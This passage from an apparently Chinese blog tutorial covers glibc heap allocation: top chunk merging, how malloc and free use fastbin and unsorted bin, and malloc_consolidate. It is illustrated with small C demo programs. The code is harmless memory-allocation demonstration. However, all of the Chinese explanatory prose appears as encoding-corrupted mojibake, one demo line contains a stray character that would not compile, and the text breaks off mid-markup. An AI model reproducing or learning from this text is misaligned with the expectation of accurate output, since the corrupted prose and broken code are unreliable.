<p><img src="/2020/12/15/%E5%A0%86/image-20201215170240262.png" alt="image-20201215170240262"> </p>
<p>æ¼”ç¤ºå®Œæˆ</p>
</blockquote>
<h3 id="0x11-top-chunkçš„å‘å‰åˆå¹¶"><a href="#0x11-top-chunkçš„å‘å‰åˆå¹¶" class="headerlink" title="0x11 top chunkçš„å‘å‰åˆå¹¶"></a>0x11 top chunkçš„å‘å‰åˆå¹¶</h3><h4 id="1-top-chunkæ¦‚å¿µ"><a href="#1-top-chunkæ¦‚å¿µ" class="headerlink" title="1.top chunkæ¦‚å¿µ"></a>1.top chunkæ¦‚å¿µ</h4><ul>
<li>å½“æˆ‘ä»¬åˆ†é…ä¸€å—å †å†…å­˜æ—¶ï¼Œtop chunkæ˜¯å‡ºäºåœ°å€çš„æœ€é«˜å¤„çš„ï¼Œå…¶å‰é¢å°±æ˜¯æˆ‘ä»¬æ‰€ç”³è¯·çš„chunk</li>
</ul>
<h4 id="2-top-chunkçš„åˆå¹¶æ“ä½œ"><a href="#2-top-chunkçš„åˆå¹¶æ“ä½œ" class="headerlink" title="2.top chunkçš„åˆå¹¶æ“ä½œ"></a>2.top chunkçš„åˆå¹¶æ“ä½œ</h4><ul>
<li>å¦‚æœtop chunkå‰é¢çš„chunkä¸æ˜¯fast chunkå¹¶ä¸”å¤„äºç©ºé—²ï¼Œé‚£ä¹ˆtop chunkå°±ä¼šåˆå¹¶è¿™ä¸ªchunk</li>
<li>å¦‚æœtop chunkå‰é¢çš„chunkæ˜¯fast chunkï¼Œä¸è®ºæ˜¯å¦ç©ºé—²ï¼Œtop chunkéƒ½ä¸ä¼šåˆå¹¶è¿™ä¸ªchunk</li>
</ul>
<h4 id="3-æ¼”ç¤º-1"><a href="#3-æ¼”ç¤º-1" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ–­ç‚¹ å †ä¿¡æ¯</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215194907019.png" alt="image-20201215194907019"></p>
<p>é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°p2æ˜¯fastbins æœªè¢«åˆå¹¶</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215194956787.png" alt="image-20201215194956787"></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ–­ç‚¹</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215195122071.png" alt="image-20201215195122071"></p>
<p>é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°p2è¢«åˆå¹¶äº†</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215195147425.png" alt="image-20201215195147425"></p>
</blockquote>
<h4 id="4-å¦‚ä½•é˜²æ­¢top-chunkçš„åˆå¹¶"><a href="#4-å¦‚ä½•é˜²æ­¢top-chunkçš„åˆå¹¶" class="headerlink" title="4.å¦‚ä½•é˜²æ­¢top chunkçš„åˆå¹¶"></a>4.å¦‚ä½•é˜²æ­¢top chunkçš„åˆå¹¶</h4><ul>
<li>åªéœ€è¦åœ¨freeæ‰çš„chunkåé¢ç»§ç»­ç”³è¯·ä¸€ä¸ªchunkï¼Œè¿™æ ·top chunkå°±ä¸ä¼šåˆå¹¶ä¹‹å‰çš„chunk</li>
</ul>
<h3 id="0x12-chunkçš„mallocã€free"><a href="#0x12-chunkçš„mallocã€free" class="headerlink" title="0x12 chunkçš„mallocã€free"></a>0x12 chunkçš„mallocã€free</h3><h4 id="1-mallocçš„æœºåˆ¶"><a href="#1-mallocçš„æœºåˆ¶" class="headerlink" title="1.mallocçš„æœºåˆ¶"></a>1.mallocçš„æœºåˆ¶</h4><ul>
<li><strong>å¦‚æœç¨‹åºæ˜¯ç¬¬ä¸€æ¬¡mallocï¼š</strong>ä¼šåˆ›å»ºä¸€ä¸ªå¾ˆå¤§çš„â€œtop chunkâ€</li>
<li><strong>å¦‚æœç¨‹åºæ˜¯ç¬¬äºŒæ¬¡åŠä¹‹åmallocï¼š</strong>ä¼šå»å…ˆå‘binsé“¾è¡¨å¯»æ‰¾ç©ºé—´ï¼Œå¦‚æœæ²¡æœ‰å†å»å‘â€œtop chunkâ€è¦ç©ºé—´ï¼›å¦‚æœâ€œtop chunkâ€ä½¿ç”¨å®Œäº†å†é€šè¿‡glibcé‡æ–°ç”³è¯·ä¸€å—æ–°çš„â€œtop chunkâ€</li>
</ul>
<h4 id="2-æ¼”ç¤º"><a href="#2-æ¼”ç¤º" class="headerlink" title="2.æ¼”ç¤º"></a>2.æ¼”ç¤º</h4><p>ä¸Šé¢æˆ‘ä»¬å·²ç»æ¼”ç¤ºè¿‡å¾ˆå¤šå›äº† ç¬¬ä¸€æ¬¡å°±ä¸æ¼”ç¤ºäº† è¿™é‡Œä¸»è¦æ¥çœ‹ä¸€ä¸‹ç¬¬äºŒæ¬¡çš„malloc</p>
<p>è¿™é‡Œæ˜¯æ‹¿fastbinçš„ä¾‹å­</p>
<h5 id="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆfastbinï¼‰"><a href="#æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆfastbinï¼‰" class="headerlink" title="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆfastbinï¼‰"></a><strong>æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆfastbinï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç›´æ¥çœ‹freeæ‰p1ä¹‹åå¯ä»¥çœ‹åˆ°æ˜¯è¿›å…¥fastbinäº†</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215200256907.png" alt="image-20201215200256907"></p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215200306820.png" alt="image-20201215200306820"></p>
<p>æˆ‘ä»¬åœ¨æ¥ç”³è¯·p2 å¯ä»¥çœ‹è§æ˜¯ç›´æ¥è¦†ç›–äº†p1</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215200355918.png" alt="image-20201215200355918"></p>
</blockquote>
<h5 id="åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰"><a href="#åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰" class="headerlink" title="åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰"></a><strong>åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æˆ‘ä»¬ç›´æ¥çœ‹p2åˆ†é…ä¹‹åæŠŠ</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215200826010.png" alt="image-20201215200826010"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹å‡ºå®ƒå¹¶æœªç”¨fastbinçš„chunk è€Œæ˜¯ä»top chunkåˆ‡å‰²äº†ä¸€éƒ¨åˆ†</p>
</blockquote>
<h5 id="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆunsorted-binï¼‰"><a href="#æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆunsorted-binï¼‰" class="headerlink" title="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆunsorted binï¼‰"></a><strong>æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆunsorted binï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x200</span>;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºæ•ˆæœï¼Œé˜²æ­¢pè¢«top chunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>çœ‹ä¸€ä¸‹chunkçš„ä¿¡æ¯</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215201134939.png" alt="image-20201215201134939"></p>
<p>free p1ï¼Œå°†p1æ”¾å…¥äº†unsorted binä¸­</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215201206634.png" alt="image-20201215201206634"></p>
<p>åˆ†é…p3 å¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥è¦†ç›–p1çš„åœ°æ–¹</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215201235306.png" alt="image-20201215201235306"></p>
</blockquote>
<h5 id="åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted-binï¼‰"><a href="#åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted-binï¼‰" class="headerlink" title="åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted binï¼‰"></a><strong>åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted binï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//ä¸ºäº†é˜²æ­¢pè¢«topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹p2åˆ†é…ä¹‹å</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215201554898.png" alt="image-20201215201554898"></p>
<p>è¿™é‡Œä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªæƒ…å†µå‘¢ï¼Ÿ</p>
<p>å…¶å®å®ƒæ˜¯åœ¨unsorted binä¸­åˆ‡å‰²äº†ä¸€å—ç¬¦åˆè‡ªå·±å¤§å°çš„chunk æ‹¿å‡ºæ¥åˆ†é…</p>
</blockquote>
<p><strong>åˆ†å‰²ä¸€å—è¾ƒå¤§çš„free chunkï¼ˆunsorted binï¼‰</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//ä¸ºäº†é˜²æ­¢pè¢«topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);c</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ ¹æ®ä¸Šé¢çš„ç†è®ºè¿™å›å°±åº”è¯¥å»top chunkä¸­åˆ‡å‰²äº† äº‹å®ä¹Ÿç¡®å®å¦‚æ­¤</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215202105325.png" alt="image-20201215202105325"></p>
</blockquote>
<p>ç»è¿‡ä»¥ä¸Šæ¼”ç¤ºæˆ‘ä»¬ä¸éš¾å¾—å‡ºä¸€ä¸‹ç»“è®º</p>
<ol>
<li>åªè¦åˆ‡å‰²å¤§å°æ­£å¥½ å®ƒå°±ä¼šä»å·²freeçš„chunkä¸­å¯»æ‰¾</li>
<li>å…³äºfastbin å’Œ unsorted binä¸­free chunkåˆ†é…æ˜¯ä¸ä¸€æ ·çš„</li>
<li>å¦‚æœè¾ƒå¤§ ä¼šä»top chunkä¸­å¯»æ‰¾</li>
</ol>
<h4 id="3-freeçš„æœºåˆ¶"><a href="#3-freeçš„æœºåˆ¶" class="headerlink" title="3.freeçš„æœºåˆ¶"></a>3.freeçš„æœºåˆ¶</h4><ul>
<li>â‘ å¦‚æœfreeçš„chunkçš„å¤§å°åœ¨0x20~0x80ä¹‹é—´ï¼ˆfastbinçš„èŒƒå›´ï¼‰ï¼Œé‚£ä¹ˆè¯¥chunkç›´æ¥æ”¾åˆ°fast binä¸Š</li>
<li>â‘¡å¦‚æœfreeçš„chunkçš„å¤§å°å¤§äº0x80ï¼ˆå¤§äºfast binçš„èŒƒå›´ï¼‰ï¼Œæ­¤æ—¶ä¸ä¼šç›´æ¥æ”¾åˆ°small binæˆ–è€…large binä¸Šé¢ã€‚è€Œæ˜¯æ”¾åˆ°unsorted binä¸Šé¢</li>
</ul>
<h3 id="0x13-malloc-consolidate"><a href="#0x13-malloc-consolidate" class="headerlink" title="0x13 malloc_consolidate"></a>0x13 malloc_consolidate</h3><p><strong>è¿™ä¸ªä¸»è¦æ˜¯è§£å†³unsorted binä¸­çš„ç¢ç‰‡åŒ–ï¼Œæ•´åˆæˆæ–°çš„binï¼Œä¹Ÿå°±æ˜¯æ”¾å…¥small binæˆ–large binä¸­</strong></p>
<h4 id="1-consolidateçš„å®šä¹‰"><a href="#1-consolidateçš„å®šä¹‰" class="headerlink" title="1.consolidateçš„å®šä¹‰"></a>1.consolidateçš„å®šä¹‰</h4><ul>
<li>æˆ‘ä»¬çŸ¥é“å¤§äº0x80çš„chunkè¢«é‡Šæ”¾ä¹‹åå°±æ”¾åˆ°äº†unsortedbinä¸Šé¢å»ï¼Œä½†æ˜¯unsortedbinæ˜¯ä¸€ä¸ªæœªåˆ†ç±»çš„binï¼Œä¸Šé¢çš„chunkä¹Ÿå¤„äºæœªåˆ†ç±»çš„çŠ¶æ€ã€‚ä½†æ˜¯è¿™äº›chunkéœ€è¦åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹è¢«æ•´ç†ç„¶åæ”¾å…¥åˆ°smallbinsæˆ–è€…largebinsä¸­</li>
<li>è¿™ä¸ªæ•´ç†çš„è¿‡ç¨‹è¢«ç§°ä¸ºunsortedbinçš„â€œconsolidateâ€ï¼Œä½†æ˜¯â€œconsolidateâ€æ˜¯è¦åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹æ‰ä¼šå‘ç”Ÿçš„ï¼Œå¹¶ä¸”ä¸mallocç´§å¯†ç›¸å…³</li>
</ul>
<h4 id="2-è§¦å‘åœºæ™¯"><a href="#2-è§¦å‘åœºæ™¯" class="headerlink" title="2.è§¦å‘åœºæ™¯"></a>2.è§¦å‘åœºæ™¯</h4><ul>
<li>å½“æˆ‘ä»¬mallocä¸€ä¸ªchunkï¼Œè¿™ä¸ªchunkçš„å¤§å°å¤§äºsmallbinçš„èŒƒå›´ï¼Œåœ¨unsortedbinä¸­å¯»æ‰¾å¯ç”¨çš„freechunkä½¿ç”¨æ—¶ï¼Œä¼šè§¦å‘malloc_conlolidate</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/20190810155737453.png" alt="img"></p>
<ul>
<li>mallocæ—¶å¦‚æœbiné“¾ä¸­æ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„freechunkï¼Œå¹¶ä¸”å»åˆ‡å‰²topchunkï¼Œå‘ç°topchunkä¹Ÿä¸å¤Ÿç”¨ï¼Œæ­¤æ—¶å›å»å†å»è°ƒç”¨malloc_consolidateè¿›è¡Œä¸€æ¬¡æ•´ç†</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/20190810155901661.png" alt="img"></p>
<ul>
<li>å‘ç°unsortedbinä¸­æœ‰å¤§çš„freechunkå¯ä»¥åˆ‡å‰²ç»™mallocä½¿ç”¨æ—¶ï¼Œåˆ‡å‰²unsortedbinï¼Œäº§ç”Ÿlast remainderçš„æ—¶å€™ä¼šconsolidate</li>
</ul>
<p><strong>ç€é‡å¼ºè°ƒï¼Œ1å’Œ2éƒ½ä¼šå»å¯»æ‰¾fastbinä¸­çš„free chunk</strong></p>
<h4 id="3-å…·ä½“åˆ†æ"><a href="#3-å…·ä½“åˆ†æ" class="headerlink" title="3.å…·ä½“åˆ†æ"></a>3.å…·ä½“åˆ†æ</h4><p><strong>å½“æˆ‘ä»¬mallocä¸€ä¸ªå¤§å°å¤§äºsmallbinçš„chunkæ—¶ï¼š</strong></p>
<ul>
<li><p><strong>ç¬¬ä¸€æ­¥ï¼š</strong>å°†fastbinsä¸­çš„chunkéƒ½æ•´ç†åˆ°unsortedbinä¸­ï¼Œæ•´ç†çš„è¿‡ç¨‹ä¸­å¦‚æœæœ‰ç‰©ç†ç›¸é‚»ä¸”ç©ºé—²çš„fastchunkå°±åˆå¹¶ï¼Œå¦‚æœfastchunkä¸topchunkç›¸é‚»ï¼Œé‚£ä¹ˆfastchunkå°±ä¸topchunkåˆå¹¶ï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨_int_mallocå‡½æ•°è°ƒç”¨çš„malloc_consolidateå‡½æ•°ä¸­ï¼‰</p>
</li>
<li><p><strong>ç¬¬äºŒæ­¥ï¼š</strong>mallocå»æ£€æŸ¥unsortedbinä¸­æ˜¯å¦æœ‰ä¸è‡ªå·±mallocå¤§å°ç›¸å¯¹åº”çš„chunkå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœæœ‰ä¸è‡ªå·±mallocå¤§å°ç›¸å¯¹åº”çš„chunkå¯ä»¥ä½¿ç”¨å°±ç›´æ¥ä½¿ç”¨ï¼›å¦‚æœæ²¡æœ‰é‚£ä¹ˆå°±å»åˆ¤æ–­unsortedbinä¸­æ˜¯å¦æœ‰å¯ä»¥ç”¨æ¥åˆ‡å‰²çš„å¤§chunkå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœå¯ä»¥åˆ‡å‰²ï¼Œå°±åˆ‡å‰²å¤§çš„chunkä½¿ç”¨ï¼Œç„¶åäº§ç”Ÿlast remainderï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨_int_mallocå‡½æ•°çš„forå¾ªç¯ä¸­ï¼‰</p>
</li>
<li><strong>ç¬¬ä¸‰æ­¥ï¼š</strong>å¦‚æœæ²¡æœ‰å¯ä»¥åˆ‡å‰²çš„å¤§chunkå¯ä»¥ä½¿ç”¨ï¼Œæ­¤æ—¶å°±å°†unsortedbinä¸Šçš„chunkæ”¾å…¥åˆ°å¯¹åº”çš„binsé“¾ä¸Š</li>
<li><strong>ç¬¬å››æ­¥ï¼š</strong>mallocä»ç¬¬ä¸€æ¬¡åˆ†é…çš„å¤§å †å—ä¸Šé¢æ‰¾ç©ºé—´æ¥ä½¿ç”¨</li>
</ul>
<h4 id="4-æ¼”ç¤ºä¸€"><a href="#4-æ¼”ç¤ºä¸€" class="headerlink" title="4.æ¼”ç¤ºä¸€"></a>4.æ¼”ç¤ºä¸€</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ‰“æ–­ç‚¹ çœ‹å †ä¿¡æ¯</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216141039796.png" alt="image-20201216141039796"></p>
<p>é‡Šæ”¾p1 çœ‹åˆ°è¿›å…¥fastbinä¸­</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216141113312.png" alt="image-20201216141113312"></p>
<p>åˆ†é…p2 å¯ä»¥çœ‹åˆ°æˆ‘ä»¬p1å¥½åƒæ˜¯è¢«è¦†ç›–äº†  æˆ‘ä»¬å…·ä½“æ¥è¯´ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216141143610.png" alt="image-20201216141143610"></p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216141159043.png" alt="image-20201216141159043"></p>
<p>å½“åˆ†é…æ¯”small binå¤§çš„chunkæ—¶ï¼Œæˆ‘ä»¬å°±ä¼šè§¦å‘consolidateï¼Œ</p>
<ol>
<li>æˆ‘ä»¬çŸ¥é“fastchunkæ˜¯ä¸ä¼šåˆå¹¶çš„ æ‰€ä»¥å®ƒä»¬è¿™æ—¶å°±ä¼šè¿›å…¥unsortedbinä¸­</li>
<li>ç„¶åmallocå»åˆ‡å‰²unsortedbinä¸­çš„è¿™ä¸ªfreechunkï¼Œå‘ç°ä¸èƒ½å¤Ÿåˆ‡å‰²ï¼Œäºæ˜¯å°±æ”¾å…¥smallbinä¸­ï¼Œæ”¾å…¥smallbinä¸­ä¹‹åä¾¿æˆä¸ºsmallchunkäº†ï¼Œå°±å¯ä»¥ä¸topchunkåˆå¹¶äº†</li>
<li>åˆå¹¶ä¹‹åmallocä»topchunkä¸­ç”³è¯·ä¸€ä¸ªå †å—</li>
</ol>
</blockquote>
<h4 id="5-æ¼”ç¤ºäºŒ"><a href="#5-æ¼”ç¤ºäºŒ" class="headerlink" title="5.æ¼”ç¤ºäºŒ"></a>5.æ¼”ç¤ºäºŒ</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> 	<span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span 